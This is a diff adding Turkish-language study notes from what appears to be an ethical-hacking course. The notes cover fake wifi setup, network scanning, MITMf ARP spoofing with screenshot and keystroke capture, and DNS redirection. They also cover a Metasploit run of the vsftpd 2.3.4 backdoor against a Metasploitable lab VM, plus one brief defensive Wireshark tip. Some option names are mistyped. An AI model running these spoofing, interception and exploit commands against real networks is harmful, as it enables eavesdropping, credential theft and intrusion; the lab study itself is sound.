@@ -1,2 +1,50 @@
 face wifi
 apt-get install mana-toolkit
+sudo netdiscover -- ip bulma
+zenmap nmap in görsel versiyonu. 192.168.0.0/24 diyerek networku tarayabilir.
+
+arp -a
+
+mitmf --arp --spoof --gateway 10.0.2.1 --target 10.0.2.4 -i eth0
+
+google ve facebook hsts güvenlik sistemini kullanıyor. Bu sistem istek http olsa dahi https e yönlendirir.
+
+dns yönledirme
+leafpad /etc/mitmf/mitmf.conf
+service apache2 start
+html in düzgün olması lazım kullanıcıyı kendi web serverımıza yönlendiriyoruz.
+
+ekran görüntüsü almak
+mitmf --arp --spoof --gateway 10.0.2.1 --target 10.0.2.4 -i eth0 --screen --interval 20
+20. de bir ekran görüntüsü alacak...
+/var/log/mitmf lasörüne gir ekran görüntüleri orada.
+
+klavye takibi
+mitmf --arp --spoof --gateway 10.0.2.1 --target 10.0.2.4 -i eth0 
+
+mitmf --help
+
+Ortadaki adam saldırısından korunmak.
+wireshark da edit + preferences + advance tabı + search kısmına arp yaz +
+arp.detech_request_stroms seçeneğini true yap.
+
+içinde açıkları barındıran bir sanal makine
+https://sourceforge.net/projects/metasploitable/files/Metasploitable2/
+resmi sitesi rapid7
+Bu linux bir makinadır. kullanıcı adı : msfadmin şifre: msfadmin
+
+#sudo reboot -- sistemi yeniden başlatır.
+
+--metaspoint framework
+#msfconsole
+msf> 
+örneğin ftp  explodini bulmak. zenmapden gelen değeri googleda aradık. rapid7 de bulduk.
+msf> use exploit/unix/ftp/vsftpd_234_backdoor
+msf> show options -- komutu ile eksik parametreleri gör
+msf> set RSHOST 10.0.2.5 --tekrar show options ile ayarlanmışmı gör.
+msf> exploit -- komutu ile çalıştırılır.
+
+
+
+
+
